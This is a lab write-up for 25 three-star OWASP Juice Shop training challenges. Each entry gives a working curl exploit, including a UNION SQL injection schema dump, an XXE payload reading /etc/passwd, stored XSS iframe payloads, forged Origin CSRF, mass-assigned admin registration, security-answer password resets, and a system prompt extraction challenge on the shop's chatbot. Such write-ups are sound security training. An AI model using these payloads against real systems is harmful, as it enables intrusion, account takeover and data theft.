# 3-Star Challenges (25)

Detailed writeups for every ★★★ challenge in the register (findings 31–53 of
`JUICE.md`). Cross-checked against the register line

> ★★★ (25): Manipulate Basket, CAPTCHA Bypass, Product Tampering, Security
> Advisory, CSRF, Database Schema, Forged Feedback, Forged Review, Deluxe
> Fraud, GDPR Data Erasure, Login Amy, Login Bender, Login Jim, Payback Time,
> Client-side XSS Protection, Privacy Policy Inspection, Admin Registration,
> Bjoern's Favorite Pet, Reset Jim's Password, API-only XSS, Upload Size,
> Upload Type, Vulnerable Infrastructure, XXE Data Access, System Prompt
> Extraction

which lists the same 25 challenges documented below (GDPR Data Erasure =
Ghost Login; Bjoern's Favorite Pet = OWASP reset).

**Prerequisites (this instance):** Juice Shop `v20.2.0` behind the MultiJuicer
reverse proxy. Every request needs the team `multi-juicer` session cookie and
`https://<host>/...` (<redacted>). Use a Bearer JWT (`Authorization: Bearer
$T`) for `/rest` + `/api` routes, the `token` cookie for `/profile`,
`/dataerasure` etc. Sources: `docs/endpoint-reference.md` and
`docs/authentication-model.md`. Placeholders below: `$T` = logged-in JWT,
`$BID` = your basket id from the login response (`authentication.bid`), `$C`
= session cookie jar. Re-read `/api/Challenges/` before re-attempting.

### Summary

1. Manipulate Basket · 2. Forged Feedback · 3. Forged Review · 4. Payback
Time · 5. XXE Data Access · 6. Database Schema · 7. CAPTCHA Bypass ·
8. Product Tampering · 9. Security Advisory (CSAF) · 10. Vulnerable
Infrastructure · 11. Deluxe Fraud · 12. CSRF · 13. Privacy Policy
Inspection · 14. Upload Size · 15. Upload Type · 16. Admin Registration ·
17. Reset Jim's Password · 18. Bjoern's Favorite Pet (OWASP reset) ·
19. GDPR Data Erasure (Ghost Login) · 20. API-only XSS · 21. Login Amy ·
22. Login Bender · 23. Login Jim · 24. Client-side XSS Protection ·
25. System Prompt Extraction

---

## 1. Manipulate Basket
Difficulty: ★★★ | Vulnerability class: CWE-639 (Authorization Bypass Through User-Controlled Key)
- Attack surface: `POST /api/BasketItems/`
- Root cause: the endpoint trusts a client-supplied `BasketId`; the guard only inspects the *first* `BasketId` field, while the item is built and verified from the *last* one.
- Exploit:
  1. Register/login a low-priv user, note `$BID` from the login response (admin's basket is id `1`).
  2. POST a basket item whose first `BasketId` equals your own `$BID` (passes the guard) and whose last `BasketId` is the victim's (`1`); the verifier fires because `user.bid != last BasketId` and the item is saved into basket `1`:
     ```
     curl -s -X POST https://<host>/api/BasketItems/ \
       -H "Authorization: Bearer $T" -H 'Content-Type: application/json' \
       --data '{"ProductId":1,"BasketId":'$BID',"quantity":1,"BasketId":1}'
     ```
- Verification: item appears in the foreign basket (`GET /rest/basket/1`) and `basketManipulateChallenge` shows solved in `/api/Challenges/`.

## 2. Forged Feedback
Difficulty: ★★★ | Vulnerability class: CWE-915 (Improperly Controlled Modification of Object Attributes / mass assignment)
- Attack surface: `POST /api/Feedbacks/`
- Root cause: `UserId` is taken from the request body instead of the session, so feedback can be attributed to any account.
- Exploit:
  1. Fetch a fresh captcha: `GET /rest/captcha/` → `{"captchaId":N,"answer":".."}`.
  2. POST feedback with `UserId` of another user (admin = `1`) while authenticated as yourself:
     ```
     curl -s -X POST https://<host>/api/Feedbacks/ \
       -H "Authorization: Bearer $T" -H 'Content-Type: application/json' \
       --data '{"captchaId":N,"captcha":"<answer>","comment":"signed as admin","rating":5,"UserId":1}'
     ```
- Verification: the verifier (`req.body.UserId != session id`) flips `forgedFeedbackChallenge`; the stored record is attributed to user id 1.

## 3. Forged Review
Difficulty: ★★★ | Vulnerability class: CWE-863 (Incorrect Authorization)
- Attack surface: `POST /rest/products/:id/reviews` (create) / `PUT /rest/products/:id/reviews` (update)
- Root cause: review `author` is client-controlled at write time and never reconciled with the token identity.
- Exploit:
  1. Log in as a normal user, then write a review under someone else's identity:
     ```
     curl -s -X POST https://<host>/rest/products/1/reviews \
       -H "Authorization: Bearer $T" -H 'Content-Type: application/json' \
       --data '{"message":"great product","author":"admin@juice-sh.op"}'
     ```
  2. (Alternative, review-update variant) `PUT /rest/products/1/reviews` with `{"id":"<existing foreign review _id>","message":"..."}` — modifying a review originally authored by a different account also satisfies the verifier.
- Verification: `GET /rest/products/1/reviews` shows the forged author; `forgedReviewChallenge` solved.

## 4. Payback Time
Difficulty: ★★★ | Vulnerability class: CWE-840 (Business Logic Errors)
- Attack surface: `POST /api/BasketItems/` + `POST /rest/basket/:id/checkout`
- Root cause: negative quantities are accepted, so an order total can be driven below zero.
- Exploit:
  1. Add a product with a negative quantity to your own basket:
     ```
     curl -s -X POST https://<host>/api/BasketItems/ \
       -H "Authorization: Bearer $T" -H 'Content-Type: application/json' \
       --data '{"ProductId":1,"BasketId":'$BID',"quantity":-1}'
     ```
  2. Check out the basket: `POST /rest/basket/:id/checkout` (any `paymentMode`).
- Verification: the checkout handler solves `negativeOrderChallenge` when the computed `totalPrice < 0`; the PDF order shows a negative total.

## 5. XXE Data Access
Difficulty: ★★★ | Vulnerability class: CWE-611 (Improper Restriction of XML External Entity Reference)
- Attack surface: `POST /file-upload` (`file` part, `.xml`)
- Root cause: the libxml2-based parser resolves external entities and echoes the parsed document back inside the 410 error message.
- Exploit:
  1. Write `xxe.xml`:
     ```
     <?xml version="1.0"?>
     <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
     <foo>&xxe;</foo>
     ```
  2. `curl -s -F "file=@xxe.xml" https://<host>/file-upload`
- Verification: the 410 response body contains the error text with `/etc/passwd` content echoed (400-char truncation); `xxeFileDisclosureChallenge` solved.

## 6. Database Schema
Difficulty: ★★★ | Vulnerability class: CWE-89 (SQL Injection)
- Attack surface: `GET /rest/products/search?q=` (raw SQLite query, 9-column result)
- Root cause: search terms are concatenated into SQL without parameterization.
- Exploit: UNION-select `sqlite_master.sql` to dump the whole schema (9 columns → 1 selected + 8 placeholders):
  ```
  curl -s "https://<host>/rest/products/search?q=x')) UNION SELECT sql,1,2,3,4,5,6,7,8 FROM sqlite_master--"
  ```
  The response rows contain every `CREATE TABLE` statement, including the `SecurityAnswers` table whose `answer` column holds the HMAC values of the security-question answers (compare with `HMAC-SHA256(answer, 'pa4qacea4VK9t9nGv7yZtwmj')`).
- Verification: `dbSchemaChallenge` solves once all definitions returned by `SELECT sql FROM sqlite_master` appear in the response; full schema captured.

## 7. CAPTCHA Bypass
Difficulty: ★★★ | Vulnerability class: CWE-799 (Improper Control of Interaction Frequency)
- Attack surface: `GET /rest/captcha/` + `POST /api/Feedbacks/`
- Root cause: a captcha id/answer pair is never invalidated, so the same pair can be replayed; the verifier counts ≥10 rapid captcha-gated submissions.
- Exploit: fetch one captcha, then post ≥10 feedbacks within ~20 s reusing the same `captchaId` and `answer`:
  ```
  for i in $(seq 1 12); do
    curl -s -X POST https://<host>/api/Feedbacks/ -H 'Content-Type: application/json' \
      --data '{"captchaId":N,"captcha":"<answer>","comment":"spam '$i'","rating":1}'
  done
  ```
- Verification: after the burst the request-handler middleware (`captchaReqId` counter) flips `captchaBypassChallenge`; the score board confirms.

## 8. Product Tampering
Difficulty: ★★★ | Vulnerability class: CWE-79 (Content Injection into Product Data)
- Attack surface: `PUT /api/Products/:id` (admin)
- Root cause: product descriptions can be overwritten via the API and are not validated; the challenge expects the O-Saft product (id `9`) to link to `https://owasp.slack.com`.
- Exploit:
  1. Admin session, then set the description of product 9 to contain the anchor:
     ```
     curl -s -X PUT https://<host>/api/Products/9 \
       -H "Authorization: Bearer $T" -H 'Content-Type: application/json' \
       --data '{"description":"...<a href=\"https://owasp.slack.com\" target=\"_blank\">"}'
     ```
  2. Trigger the check with any follow-up API request (`GET /api/Products/`).
- Verification: `changeProductChallenge` (Product Tampering) solves on the next request once `description` contains the expected link and no longer the original one.

## 9. Security Advisory (CSAF)
Difficulty: ★★★ | Vulnerability class: CWE-200 (Exposure of Internal Verification Data)
- Attack surface: `POST /api/Feedbacks/`
- Root cause: the challenge is solved by submitting the value of the internal config key `challenges.csafHashValue` (the CSAF advisory self-checksum) as free text — the verifier `LIKE`s a feedback/ complaint against it.
- Exploit:
  1. Recover the full checksum string (pinned v20.2.0 config / `challenges.csafHashValue`); documented prefix/suffix: `7e7ce7c6...42e843`.
  2. Fetch a captcha (`GET /rest/captcha/`) and POST a feedback whose comment contains the hash:
     ```
     curl -s -X POST https://<host>/api/Feedbacks/ -H 'Content-Type: application/json' \
       --data '{"captchaId":N,"captcha":"<answer>","rating":5,"comment":"advisory checksum <csafHashValue>"}'
     ```
- Verification: background scanner (`databaseRelatedChallenges`) matches the comment and solves `csafChallenge`.

## 10. Vulnerable Infrastructure
Difficulty: ★★★ | Vulnerability class: CWE-937 / CWE-1104 (Use of Known-Vulnerable Component)
- Attack surface: `POST /api/Complaints/`
- Root cause: the app depends on MongoDB `4.4.29` (end-of-life); the "inform the shop" verifier scans complaint text for the pair `mongo` + `4.4.29`.
- Exploit: submit a natural complaint containing both tokens (avoid verbatim source text):
  ```
  curl -s -X POST https://<host>/api/Complaints/ -H "Authorization: Bearer $T" \
    -H 'Content-Type: application/json' \
    --data '{"message":"Your mongo database version 4.4.29 reached end of life and is vulnerable - please upgrade it."}'
  ```
- Verification: `vulnerableDockerImageChallenge` (Vulnerable Infrastructure) solves once the complaint row matches both `%mongo%` and `%4.4.29%`.

## 11. Deluxe Fraud
Difficulty: ★★★ | Vulnerability class: CWE-840 (Business Logic Errors)
- Attack surface: `POST /rest/deluxe-membership`
- Root cause: only `paymentMode == wallet` or `card` are charged/validated; any other value sails through and upgrades the account for free.
- Exploit:
  ```
  curl -s -X POST https://<host>/rest/deluxe-membership \
    -H "Authorization: Bearer $T" -H 'Content-Type: application/json' \
    --data '{"UserId":<your id>,"paymentMode":"fake"}'
  ```
- Verification: response `"You are now a deluxe member!"` plus a fresh deluxe token; `freeDeluxeChallenge` solved.

## 12. CSRF
Difficulty: ★★★ | Vulnerability class: CWE-352 (Cross-Site Request Forgery)
- Attack surface: `POST /profile` (cookie-token route)
- Root cause: the `token` cookie is sent automatically by browsers and the profile change is protected only by a weak Origin allowlist that includes `http://htmledit.squarefree.com`.
- Exploit (replay of the cross-site request; real browsers need no custom header):
  1. Log in so the `token` cookie is set.
  2. POST a username change carrying an allowlisted cross-site `Origin`:
     ```
     curl -s -X POST https://<host>/profile \
       -b "token=$T" -b "$C" \
       -H "Origin: http://htmledit.squarefree.com" \
       -H 'Content-Type: application/x-www-form-urlencoded' \
       --data-urlencode "username=csrf-changed"
     ```
- Verification: `csrfChallenge` solves (Origin/referer contains the allowlisted host and the username changed); `GET /profile` renders the new name.

## 13. Privacy Policy Inspection
Difficulty: ★★★ | Vulnerability class: CWE-200 (Hidden Asset / Security through Obscurity)
- Attack surface: `GET /we/may/also/instruct/you/to/refuse/all/reasonably/necessary/responsibility`
- Root cause: the privacy policy text embeds a hidden link to a proof image on a route that is only discoverable by reading the fine print.
- Exploit:
  ```
  curl -s https://<host>/we/may/also/instruct/you/to/refuse/all/reasonably/necessary/responsibility -o proof.jpg
  ```
- Verification: the route solves `privacyPolicyProofChallenge` on serving `thank-you.jpg` (the "You should decide for the greater good" proof image).

## 14. Upload Size
Difficulty: ★★★ | Vulnerability class: CWE-400 (Unconstrained Resource Consumption)
- Attack surface: `POST /file-upload`
- Root cause: uploads larger than 100,000 bytes are not rejected; the verifier simply checks `file.size > 100000`.
- Exploit (keep an allowed extension so no other verifier fires):
  ```
  head -c 100001 /dev/urandom > big.pdf
  curl -s -F "file=@big.pdf" https://<host>/file-upload
  ```
- Verification: `uploadSizeChallenge` solved on the multipart handling regardless of the deprecation error returned.

## 15. Upload Type
Difficulty: ★★★ | Vulnerability class: CWE-434 (Unrestricted Upload of Dangerous File Type)
- Attack surface: `POST /file-upload`
- Root cause: the extension allowlist (`pdf`, `xml`, `zip`, `yml`, `yaml`) is the only gate and is enforced after the challenge check runs.
- Exploit (any other extension solves it):
  ```
  printf 'garbage' > shell.html
  curl -s -F "file=@shell.html" https://<host>/file-upload
  ```
- Verification: `uploadTypeChallenge` solves because the extension is outside the allowlist; the server rejects the file but the flag is already set.

## 16. Admin Registration
Difficulty: ★★★ | Vulnerability class: CWE-269 / CWE-915 (Improper Privilege Management via mass assignment)
- Attack surface: `POST /api/Users/`
- Root cause: the registration handler persists the request body as-is, so `role` is mass-assignable.
- Exploit:
  ```
  curl -s -X POST https://<host>/api/Users/ -H 'Content-Type: application/json' \
    --data '{"email":"admin2@example.com","password":"P@ssw0rd!","passwordRepeat":"P@ssw0rd!","role":"admin"}'
  ```
- Verification: response `201` with `"role":"admin"`; the `registerAdminChallenge` middleware fires on `req.body.role === 'admin'`; logging in grants the administration section.

## 17. Reset Jim's Password
Difficulty: ★★★ | Vulnerability class: CWE-640 (Weak Password Recovery) + CWE-321 (Static HMAC key)
- Attack surface: `POST /rest/user/reset-password` (+ `GET /rest/user/security-question?email=`)
- Root cause: answers are checked only against `HMAC-SHA256(answer, 'pa4qacea4VK9t9nGv7yZtwmj')`, and Jim's answer is the documented `Samuel`.
- Exploit:
  ```
  curl -s -X POST https://<host>/rest/user/reset-password -H 'Content-Type: application/json' \
    --data '{"email":"jim@juice-sh.op","answer":"Samuel","new":"JimNewPass123!","repeat":"JimNewPass123!"}'
  ```
- Verification: `resetPasswordJimChallenge` solves server-side on reset (`user.id === jim && answer === 'Samuel'`); log in with the new password to confirm.

## 18. Bjoern's Favorite Pet (OWASP reset)
Difficulty: ★★★ | Vulnerability class: CWE-640 (Weak Password Recovery)
- Attack surface: `POST /rest/user/reset-password`
- Root cause: reset of `bjoern@owasp.org` is protected only by the pet-name answer `Zaya`.
- Exploit:
  ```
  curl -s -X POST https://<host>/rest/user/reset-password -H 'Content-Type: application/json' \
    --data '{"email":"bjoern@owasp.org","answer":"Zaya","new":"ZayaReset123!","repeat":"ZayaReset123!"}'
  ```
- Verification: `resetPasswordBjoernOwaspChallenge` solves on reset; the new password authenticates.

## 19. GDPR Data Erasure (Ghost Login)
Difficulty: ★★★ | Vulnerability class: CWE-285 (Improper Authorization after Erasure)
- Attack surface: `POST /dataerasure` + `POST /rest/user/login`
- Root cause: data erasure only wipes the account's personal data/logs a deletion request while the authentication row stays usable; the erased identity can still be logged into afterwards — the "ghost login". The register target account is the erased seed user `chris.pike@juice-sh.op`.
- Exploit:
  1. In control of the account, submit the GDPR erasure form: `POST /dataerasure` (authenticated via the `token` cookie; answer the security question); the session is cleared.
  2. Log back in with the same credentials (password storage is untouched by erasure):
     ```
     curl -s -X POST https://<host>/rest/user/login -H 'Content-Type: application/json' \
       --data '{"email":"chris.pike@juice-sh.op","password":"<redacted recovered password>"}'
     ```
- Verification: post-login verifier (`user.id === users.chris.id`) flips `ghostLoginChallenge`; `/rest/user/whoami` returns the erased identity. (`gdprDataErasureChallenge` is the same finding.)

## 20. API-only XSS
Difficulty: ★★★ | Vulnerability class: CWE-79 (Stored XSS)
- Attack surface: `PUT /api/Products/:id` (raw REST, no UI)
- Root cause: the product `description` setter runs the persisted-XSS solve check while the challenge is unsolved and applies no sanitizer, so a payload delivered purely over the API (never typed in the UI) persists.
- Exploit:
  ```
  curl -s -X PUT https://<host>/api/Products/1 \
    -H "Authorization: Bearer $T" -H 'Content-Type: application/json' \
    --data '{"description":"<iframe src=\"javascript:alert(`xss`)\">"}'
  ```
- Verification: `restfulXssChallenge` (API-only XSS) solves in the model setter; `GET /api/Products/1` returns the raw payload.

## 21. Login Amy
Difficulty: ★★★ | Vulnerability class: CWE-522 (Insufficiently Protected Credentials)
- Attack surface: `POST /rest/user/login`
- Root cause: Amy's seed credentials were disclosed in application data (photo wall / public seed), enabling a direct credential login.
- Exploit:
  ```
  curl -s -X POST https://<host>/rest/user/login -H 'Content-Type: application/json' \
    --data '{"email":"amy@juice-sh.op","password":"<redacted>"}'
  ```
- Verification: pre-login verifier matches `amy@juice-sh.op` + the disclosed password and solves `loginAmyChallenge`.

## 22. Login Bender
Difficulty: ★★★ | Vulnerability class: CWE-522 (Insufficiently Protected Credentials)
- Attack surface: `POST /rest/user/login`
- Root cause: Bender's account credentials are recoverable from application data / reset surface; the verifier keys on the logged-in user id.
- Exploit:
  ```
  curl -s -X POST https://<host>/rest/user/login -H 'Content-Type: application/json' \
    --data '{"email":"bender@juice-sh.op","password":"<redacted>"}'
  ```
- Verification: post-login verifier (`user.id === users.bender.id`) solves `loginBenderChallenge` (resetting Bender first — answer `Stop'n'Drop`, 4★ — also yields a working login).

## 23. Login Jim
Difficulty: ★★★ | Vulnerability class: CWE-522 (Insufficiently Protected Credentials)
- Attack surface: `POST /rest/user/login`
- Root cause: Jim's account can be signed into once his password is known (e.g. via his weak security question, reset answer `Samuel`); the verifier keys on the logged-in user id.
- Exploit:
  ```
  curl -s -X POST https://<host>/rest/user/login -H 'Content-Type: application/json' \
    --data '{"email":"jim@juice-sh.op","password":"<redacted or password set in #17>"}'
  ```
- Verification: post-login verifier (`user.id === users.jim.id`) solves `loginJimChallenge`.

## 24. Client-side XSS Protection
Difficulty: ★★★ | Vulnerability class: CWE-79 (Stored XSS via registration)
- Attack surface: `POST /api/Users/`
- Root cause: the check lives on the **email** setter, not the username. While the challenge is unsolved, `models/user.ts` runs `solveIf(..., () => email?.includes('<iframe src="javascript:alert(`xss`)">'))` and skips sanitisation of `email` entirely — so the payload is valid *as the email address*.
- Exploit: register with the payload in the email field:
  ```
  curl -s -X POST https://<host>/api/Users/ -H 'Content-Type: application/json' \
    --data '{"email":"<iframe src=\"javascript:alert(`xss`)\">","password":"xss123","passwordRepeat":"xss123"}'
  ```
- Verification: the email setter flips the challenge immediately on registration; no browser/UI step involved.

## 25. System Prompt Extraction
Difficulty: ★★★ | Vulnerability class: CWE-200 (Exposure of Internal System Prompt)
- Attack surface: `POST /api/Complaints/` (verifier polls the `Complaints` table)
- Root cause: **not LLM-gated.** `routes/verify.ts` (`databaseRelatedChallenges` → `systemPromptExtractionChallenge`) runs on ordinary HTTP requests and solves as soon as *any complaint message* is textually similar to `buildSystemPrompt()` — `checkSystemPromptSimilarity` is a Dice-coefficient comparison (threshold 0.25) over the lower-cased, trimmed text. No `/rest/chat` call, no working LLM API required (the chat backend was unreachable in this deployment).
- Exploit:
  1. Reconstruct the prompt from the pinned upstream `v20.2.0` source (`routes/chat.ts`, `buildSystemPrompt()`): it is static boilerplate filled with the shop's own config (`application.chatBot.name` = the bot name, `application.name`) plus the chatted user's username — all derivable from shop data/config without any model interaction.
  2. Submit the recovered prompt text as a complaint message:
     ```
     curl -s -X POST https://<host>/api/Complaints/ -H "Authorization: Bearer $T" \
       -H 'Content-Type: application/json' \
       --data '{"message":"You are \"Juicy the Smart Assistant\", the friendly customer service chatbot ... <full reconstructed prompt>"}'
     ```
  3. Trigger the scanner with any follow-up request (e.g. `GET /api/Challenges/`).
- Verification: `systemPromptExtractionChallenge` solves once the Dice coefficient between the complaint and the server-side reference prompt reaches ≥ 0.25 — confirmed even though the LLM endpoint itself was down.
